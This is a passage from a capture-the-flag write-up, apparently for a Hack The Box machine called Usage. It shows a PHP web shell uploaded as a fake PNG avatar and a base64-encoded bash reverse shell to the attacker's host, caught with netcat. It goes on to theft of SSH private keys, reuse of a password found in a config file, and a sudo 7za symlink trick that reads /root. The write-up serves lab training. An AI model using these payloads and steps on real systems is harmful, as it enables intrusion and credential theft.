Cookie: XSRF-TOKEN=eyJpdiI6ImFTaWlpbWQ1OHZSb0ZpdFJERTNXVFE9PSIsInZhbHVlIjoibzQyVWUzcXhWejNxLzZhOHRlcDdGVnlkMW5vWXNMSytnQ0pCOUJLVmg5U2FCT24reVVoY3ZQOFZzNlV1UC9oYkd0MFhXS3BLZmJUNWx6RWpUdDFpQlBuTnl6cmlqbXZYbnprcThVTzFxSGFrc0NITlJ2YWsveDZuUmxrRDFNenYiLCJtYWMiOiI4ZWMwZTFlNDg2ZTYwM2U5YWJkZDYzNzMyMjlhZTMxMjc4MThhOWMzMDQyNjlkYjZiZjdmMGVkMWQ2MGYzNjUxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkUxY3ZPOGJxRWtGV0JWSTFneXQ2dnc9PSIsInZhbHVlIjoieDJYTXQyZnRoaGhXbjZoMXBSN0dEZzR0OHBFZnovYzhnS1BEdStvWEY2NVovaUpoTGNQQVFaOWFNanB3diswSWQ3ckxYckgvU2JRNTluOXJLeWNGTEhqczM1M2czNHBnL2Z5RkJBTUpQeXlsOUFyU1hWSmc1bDlqWjYwSjY0OWwiLCJtYWMiOiJmZjkxNzhjMTZhMjk0YTc4ZTdlMzE2ZGY1OTU5NzU1OGJkOGRiODVlOTRjNjFlYjE4NjZjMzZlYWIwNzIzYzBhIiwidGFnIjoiIn0%3D; remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjFmU2Y2UVdwZkpGYnhhb3QvNlk3VUE9PSIsInZhbHVlIjoiYjZZOTFCTWRpbU11b1VzZk95ZXQ2ajJRYkZGNHJnV2V0SkQvRjNadE9UMEhYcTFDVHVJemJweURHdGYwWkZTSVlkQ3F5YVlJMUVyQmo4bGJackxqbzBuakZkdm1hR05HV3FtWkd1aVR5S1oycmgzOVIzekdTclNjQWhqRlY4amU4ZHliVGlBZkd3OEZLV3p4eDdLdVhWa0J4aEVSMXowWmJwRk9nRDNDeEtsWXNoQlRBMmVVdG8rUUJybG9XT3VnZDlDWXhxUTFsY2JwTzVaaFZlMlcwek9kOHhEbnhxUEpYK0pOZWxqMVJqbz0iLCJtYWMiOiIxOGUyYTQ1NTJkNTY4NTdiZGExN2QwYzEwZjQ5ZDBiYTQ1OWNhNzQ4ZmE3MmU2YWQ0ZmIyNjIyOWFiOWNmYTAxIiwidGFnIjoiIn0%3D

-----------------------------108357318173490374446982946
Content-Disposition: form-data; name="name"

{{ 7 * 7 }}
-----------------------------108357318173490374446982946
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php echo 'IN'; ?>


-----------------------------108357318173490374446982946
Content-Disposition: form-data; name="_token"

5lKCIFqCAG9OR0xmD2ksiZalfSMcXoxEpI8XbOiR
-----------------------------108357318173490374446982946
Content-Disposition: form-data; name="_method"

PUT
-----------------------------108357318173490374446982946--
```

This one worked. I refreshed the page and my file was there instead of the image.

![Uploaded Shell](/assets/images/2024/07/Usage/UploadedShell.png "Upladed Shell")

I clicked on the button to view my image. It displayed 'IN', which meant that my PHP code was executed.

I created a reverse shell payload.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.104/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK
```

And uploaded it the same way.

```bash
POST /admin/auth/setting HTTP/1.1
Host: admin.usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-PJAX: true
X-PJAX-Container: #pjax-container
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------39024373798398473741341256299
Content-Length: 111052
Origin: http://admin.usage.htb
Connection: keep-alive
Referer: http://admin.usage.htb/admin/auth/setting
Cookie: XSRF-TOKEN=eyJpdiI6ImJaV3RjOVBMdXlQMTd0RzFsbTVyN1E9PSIsInZhbHVlIjoiMHlGQWhKZVVIVXhZOVVKRTdnQUIzYXlaK0dwNk1GdGZ0R2c4UzYxRGNkK3VkRW9OLzRuT0NFbEp2ZVJrY3hRbElJNklzRkN0NloxZUUyZ2lyMU9wVkZPTUdtQ2REdnR2R1V4UlZGMFhLc082MWt5c0hsVGVtTCtGNDVoNFVsOW4iLCJtYWMiOiJlNTk3NGRlNjBkZjgxNGFiZGM2NjRjZGNjYmZmYzg5N2NmZTQxMzVmZWZlNTY1NzVmYzc2NzBhOTZhYzVhZDM5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjUvdjAzNnJranAweERzVXBKWGhqcWc9PSIsInZhbHVlIjoic3dRbGgwTktKVXpHSmJISnhwbmRjWk03NGpCanVyNVpBYXNmdFpCak9tS0V0TUVhK1BSQ3Yzbi9JdGJob3d2eit5cExYWkt6a2RiRjRQcTZPZ29lUDVjUnBpSzA2ZlZOTXlOZEJDUVg0ZmxNTEhyeDQxNERHSmhXbkJHZncwZ0UiLCJtYWMiOiI2MTRiOGFlNDE1OTU4NjMwMjA1NTI2YzNhNDg2ZmE1OWJhNjVkNDI1MmMwODVkNjVkZGZkOWFkY2FjOTRiZGU5IiwidGFnIjoiIn0%3D; remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IkRWNktES0FQS3ZUQ0NKbFg1Y1B0b1E9PSIsInZhbHVlIjoibTFvWWVsMG8xdzRsVlZDTlg1WXlMTGM2U015Y0cvSnB6aXBXM0ZzKzB2U2U5d2FISWdhY0wrQ0g3TUlYMWJ0aVNibm1QZEpRRFVKdWczT1RRNzZlMENlL3Q5ZjJNazU3ZSsrZTBzc0ZjdGVjSUNRVG5Ma3BYM0NkamlTUTNDT2J2L2VIZmVVeHdWNEVJVG1hN0hQdlc3TVZFdU9XMTdDTVdpZkM4SyszcTJzTVRscXFsM1lITGNJdWE4MmRmOVZyK2ZDWmRKdkQ3OVBlZ0VITmhkaENpL2VERmdHOFM2QkxyTEE5NS9tRFlWTT0iLCJtYWMiOiI3NTY1MWJiMjUxOWNmNDg2NWM1NjIwZThmNmViY2IzNzkwMmNjYjAxOGJkNWY5MzAxNWY1YTJhNTI5MGRhMDI5IiwidGFnIjoiIn0%3D

-----------------------------39024373798398473741341256299
Content-Disposition: form-data; name="name"

{{ 7 * 7 }}
-----------------------------39024373798398473741341256299
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK|base64 -d |bash`; ?>
-----------------------------39024373798398473741341256299
Content-Disposition: form-data; name="_token"

PXY6nm2TiwkvSCf5IJcA4KX8dp2pa48YkSaeg36W
-----------------------------39024373798398473741341256299
Content-Disposition: form-data; name="_method"

PUT
-----------------------------39024373798398473741341256299--
```

When I looked at my avatar, I got a reverse shell and the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.133.91] 48178
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell

dash@usage:/var/www/html/project_admin/public/uploads/images$ whoami
whoami
dash

dash@usage:/var/www/html/project_admin/public/uploads/images$ ls
ls
shell.php

dash@usage:/var/www/html/project_admin/public/uploads/images$ ls ~/
ls ~/
user.txt

dash@usage:/var/www/html/project_admin/public/uploads/images$ cat ~/user.txt
cat ~/user.txt
REDACTED
```

## User xander

I was connected as the user dash. They had an SSH key in their home folder. I copied it to my machine and reconnected to the server with SSH.

```bash
dash@usage:/var/www/html/project_admin/public/uploads/imagels -la ~/
ls -la ~/
total 52
drwxr-x--- 6 dash dash 4096 Jun 24 20:01 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Jun 24 20:01 .monit.pid
-rw------- 1 dash dash 1192 Jun 24 20:02 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Jun 24 18:59 user.txt

dash@usage:/var/www/html/project_admin/public/uploads/images$ ls -la ~/.ssh
ls -la ~/.ssh
total 20
drwx------ 2 dash dash 4096 Aug 24  2023 .
drwxr-x--- 6 dash dash 4096 Jun 24 20:01 ..
-rw------- 1 dash dash  564 Aug 24  2023 authorized_keys
-rw------- 1 dash dash 2590 Aug 24  2023 id_rsa
-rw-r--r-- 1 dash dash  564 Aug 24  2023 id_rsa.pub

dash@usage:/var/www/html/project_admin/public/uploads/images$ cat ~/.ssh/id_rsa
<ject_admin/public/uploads/images$ cat ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ vim dash_id_rsa

$ chmod 600 dash_id_rsa

$ ssh -i dash_id_rsa dash@target
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Jun 24 08:04:46 PM UTC 2024

  System load:           0.05615234375
  Usage of /:            65.4% of 6.53GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.133.91
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5ee1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
dash@usage:~$
```

Once I had a stable connection, I took another look at the user's home folder.

```bash
dash@usage:~$ ls -la
total 56
drwxr-x--- 6 dash dash 4096 Jun 24 20:11 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Jun 24 20:09 .monit.pid
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1192 Jun 24 20:06 .monit.state
-rw------- 1 dash dash  260 Jun 24 20:11 .mysql_history
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Jun 24 18:59 user.txt
```

The monitrc file looked interesting.

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:REDACTED

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

It contained a password. I tried to use it with sudo and to become another user.

```bash
dash@usage:~$ sudo -l
[sudo] password for dash:
Sorry, try again.
[sudo] password for dash:
sudo: 1 incorrect password attempt

dash@usage:~$ su xander
Password:
xander@usage:/home/dash$
```

It failed with sudo, but worked to su as xander.

## Root

I checked if I could run anything with `sudo` as the user xander.

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

xander@usage:~$ file /usr/bin/usage_management
/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
```

I was able to run a binary as root. I gave it a try.

```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17945 files, 113878700 bytes (109 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20929


Files read from disk: 17945
Archive size: 54829552 bytes (53 MiB)
Everything is Ok

xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 2

xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 3
Password has been reset.
```

It was a utility that took backups of the website and database and allowed resetting the admin's password. I downloaded the binary to my machine and opened it in Ghidra.

The code was fairly simple. The main function took the option provided by the user and called the associated function.

![Main](/assets/images/2024/07/Usage/FunctionMain.png "Main")

The function to reset the admin password just printed that the password was resetted, but it didn't do anything.

![Reset Admin Password](/assets/images/2024/07/Usage/FunctionResetAdminPassword.png "Reset Admin Password")

The function to backup the database used `mysqldump` to dump the content.

![Backup MySQL Data](/assets/images/2024/07/Usage/FunctionBackupMysqlData.png "Backup MySQL Data")

And finally, the function to backup the website was using `7za` to take the backup.

![Backup Web Content](/assets/images/2024/07/Usage/FunctionBackupWebContent.png "Backup Web Content")

All the call to external programs were using full paths. So I could not create a replacement for them.

`7za` was using the `-snl` flag.

```bash
xander@usage:~$ 7za --help | grep snl
  -snl : store symbolic links as links
```

This meant that I could not simply add a link to the shadow file in the webroot and get the content in the archive. I tried it anyway just in case there was a bug. When I uncompress the archive that was created, the file only contained the path to the target of the symlink.

```bash
xander@usage:/tmp/tmp.HanI6LdO2q$ cat shadow
/etc/shadow
```

I tried the same thing, but with a folder instead of a file.

```bash
xander@usage:~$ cd /var/www/html/

xander@usage:/var/www/html$ ls -la
total 16
drwxrwxrwx  4 root xander 4096 Jun 24 20:41 .
drwxr-xr-x  3 root root   4096 Apr  2 21:15 ..
drwxrwxr-x 13 dash dash   4096 Jun 24 20:08 project_admin
drwxrwxr-x 12 dash dash   4096 Jun 24 20:09 usage_blog

xander@usage:/var/www/html$ ln -s /root .

xander@usage:/var/www/html$ ls -la
total 16
drwxrwxrwx  4 root   xander 4096 Jun 24 20:42 .
drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ..
drwxrwxr-x 13 dash   dash   4096 Jun 24 20:08 project_admin
lrwxrwxrwx  1 xander xander    5 Jun 24 20:42 root -> /root
drwxrwxr-x 12 dash   dash   4096 Jun 24 20:09 usage_blog

xander@usage:/var/www/html$ ls -la root
lrwxrwxrwx 1 xander xander 5 Jun 24 20:42 root -> /root

xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 72259764

Scanning the drive:
3185 folders, 18001 files, 131412034 bytes (126 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 21186


Files read from disk: 18001
Archive size: 72259764 bytes (69 MiB)
Everything is Ok
```

I extracted the files from the backup.

```bash
xander@usage:/var/www/html$ mktemp -d
/tmp/tmp.zn5GHM3DMW

xander@usage:/var/www/html$ cd /tmp/tmp.zn5GHM3DMW

xander@usage:/tmp/tmp.zn5GHM3DMW$ cp /var/backups/project.zip .

xander@usage:/tmp/tmp.zn5GHM3DMW$ unzip project.zip
Archive:  project.zip
 extracting: id_rsa
   creating: project_admin/
  inflating: project_admin/.editorconfig
  inflating: project_admin/.env
  inflating: project_admin/.env.example
  inflating: project_admin/.gitattributes
  inflating: project_admin/.gitignore
  inflating: project_admin/README.md
   creating: project_admin/app/
   creating: project_admin/app/Admin/
   creating: project_admin/app/Admin/Controllers/
  inflating: project_admin/app/Admin/Controllers/AuthController.php
  inflating: project_admin/app/Admin/Controllers/ExampleController.php

  ...

  inflating: usage_blog/vendor/webmozart/assert/README.md
  inflating: usage_blog/vendor/webmozart/assert/composer.json
   creating: usage_blog/vendor/webmozart/assert/src/
  inflating: usage_blog/vendor/webmozart/assert/src/Assert.php
  inflating: usage_blog/vendor/webmozart/assert/src/InvalidArgumentException.php
  inflating: usage_blog/vendor/webmozart/assert/src/Mixin.php
  inflating: usage_blog/vite.config.js
finishing deferred symbolic links:
  project_admin/public/storage -> ../storage/app/public
  root/.bash_history     -> /dev/null
  root/.mysql_history    -> /dev/null
  root/snap/lxd/current  -> 24322

xander@usage:/tmp/tmp.zn5GHM3DMW$ ls
id_rsa  project_admin  project.zip  root  usage_blog

xander@usage:/tmp/tmp.zn5GHM3DMW$ ls -la root/
total 44
drwx------ 7 xander xander 4096 Jun 24 18:59 .
drwx------ 5 xander xander 4096 Jun 24 20:43 ..
lrwxrwxrwx 1 xander xander    9 Jun 24 20:44 .bash_history -> /dev/null
-rw-r--r-- 1 xander xander 3106 Oct 15  2021 .bashrc
drwxr-xr-x 3 xander xander 4096 Aug 24  2023 .cache
-rwxr-xr-x 1 xander xander  307 Apr  3 13:24 cleanup.sh
drwxr-xr-x 4 xander xander 4096 Aug 22  2023 .config
drwxr-xr-x 3 xander xander 4096 Aug 21  2023 .local
lrwxrwxrwx 1 xander xander    9 Jun 24 20:44 .mysql_history -> /dev/null
-rw-r----- 1 xander xander   33 Jun 24 18:59 root.txt
drwx------ 3 xander xander 4096 Aug  6  2023 snap
drwx------ 2 xander xander 4096 Apr  2 23:07 .ssh
-rw-r--r-- 1 xander xander 1444 Oct 28  2023 usage_management.c

xander@usage:/tmp/tmp.zn5GHM3DMW$ ls -la root/.ssh/
total 20
drwx------ 2 xander xander 4096 Apr  2 23:07 .
drwx------ 7 xander xander 4096 Jun 24 18:59 ..
-rw-r--r-- 1 xander xander   92 Apr  3 01:10 authorized_keys
-rw------- 1 xander xander  399 Apr  3 01:10 id_rsa
-rw-r--r-- 1 xander xander   92 Apr  3 01:10 id_rsa.pub

xander@usage:/tmp/tmp.zn5GHM3DMW$ cat root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----

xander@usage:/tmp/tmp.zn5GHM3DMW$ cat root/root.txt
REDACTED
```

The root folder was readable. I was able to read the root flag from there. It also had an SSH key that I copied to my machine and used to reconnect as root.

```bash
$ vim root_id_rsa

$ chmod 600 root_id_rsa

$ ssh -i root_id_rsa root@target
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Jun 24 08:39:39 PM UTC 2024

  System load:           0.373046875
  Usage of /:            71.7% of 6.53GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.129.133.91
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5ee1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40

root@usage:~# cat root.txt
REDACTED
```